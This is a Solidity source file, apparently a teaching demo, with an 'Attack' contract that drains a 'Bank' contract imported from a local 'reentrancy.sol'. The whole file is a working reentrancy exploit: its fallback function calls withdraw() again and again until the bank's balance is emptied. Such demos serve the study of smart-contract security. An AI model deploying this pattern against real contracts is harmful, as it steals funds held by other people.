// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;
import "./reentrancy.sol";

contract Attack {
    Bank public bank;

    constructor(address _bankAddress) {
        bank = Bank(_bankAddress);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            // Call the withdraw function again
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}
